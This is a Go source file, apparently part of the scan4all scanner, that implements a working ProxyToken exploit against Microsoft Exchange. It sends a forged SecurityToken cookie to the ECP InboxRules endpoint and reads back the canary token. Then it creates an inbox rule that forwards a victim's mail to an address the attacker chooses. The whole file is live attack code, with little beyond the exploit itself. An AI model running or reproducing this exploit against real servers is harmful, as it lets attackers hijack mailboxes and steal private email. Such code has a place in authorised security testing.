package exchange

import (
	"fmt"
	"github.com/GhostTroops/scan4all/lib/util"
	"strings"
)

func splitequal(msexch string) string {
	msexch1 := strings.Split(msexch, "=")
	msexch2 := msexch1[0]

	return msexch2
}

func exploit1(target, targetemail, victimemail string) {
	user_agent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
	/*构造payload*/
	if !strings.Contains(target, "http") {
		target = "http://" + target
	}
	m1 := map[string]string{
		"User-Agent":      user_agent,
		"Connection":      "close",
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
		"Accept-Encoding": "gzip, deflate",
		"Cookie":          "SecurityToken=x",
		"Content-Type":    "application/json; charset=utf-8",
	}
	if do, err := util.DoGet(target+"/ecp/"+targetemail+"/RulesEditor/InboxRules.svc/Newobject", m1); nil == err {
		defer do.Body.Close()
		if do.StatusCode == 404 && splitequal(do.Header["Set-Cookie"][0]) == "msExchEcpCanary" {
			fmt.Println("[+] req status: " + do.Status)
			s1 := splitmsexch(do.Header["Set-Cookie"][0])
			fmt.Println("[+] target Set-Cookie's msExchEcpCanary value is: " + s1)
			fmt.Println("[+] target is vulnerable to proxytoken !")
			util.SendLog(target, "exchange", s1, target+"/ecp/"+targetemail+"/RulesEditor/InboxRules.svc/Newobject")
			postdata := `{"properties":{"RedirectTo":[{"RawIdentity":"` + targetemail + `","DisplayName":"` + targetemail + `","Address":"` + targetemail + `","AddressOrigin":0,"galContactGuid":null,"RecipientFlag":0,"RoutingType":"SMTP","SMTPAddress":"` + targetemail + `"}],"Name":"Testrule","StopProcessingRules":true}}`

			if do1, err := util.DoPost(target+"/ecp/"+victimemail+"RulesEditor/InboxRules.svc/Newobject?msExchEcpCanary="+splitmsexch(do.Header["Set-Cookie"][0]), m1, strings.NewReader(postdata)); nil == err {
				defer do1.Body.Close()
				if do1.StatusCode == 200 {
					fmt.Println("[+] req status: " + do1.Status)
					s1 = splitmsexch(do.Header["Set-Cookie"][0])
					fmt.Println("[+] target Set-Cookie's msExchEcpCanary value is: " + s1)
					fmt.Println("[+] set email redirection rule successed !")
					util.SendLog(target, "exchange", s1, "/ecp/"+victimemail+"RulesEditor/InboxRules.svc/Newobject?msExchEcpCanary="+splitmsexch(do.Header["Set-Cookie"][0]))
				} else {
					fmt.Println("[-] req status: " + do1.Status)
					fmt.Println("[-] target Set-Cookie value is: " + splitequal(do.Header["Set-Cookie"][0]))
					fmt.Println("[-] set email redirection rule failed !")
				}
			}
		} else {
			fmt.Println("[-] req status: " + do.Status)
			fmt.Println("[-] target Set-Cookie value is: " + splitequal(do.Header["Set-Cookie"][0]))
			fmt.Println("[-] target is not vulnerable to proxytoken !")
		}
	}
}

func DoCheckProxyToken(target, targetemail, victimemail string) {
	exploit1(target, targetemail, victimemail)
}
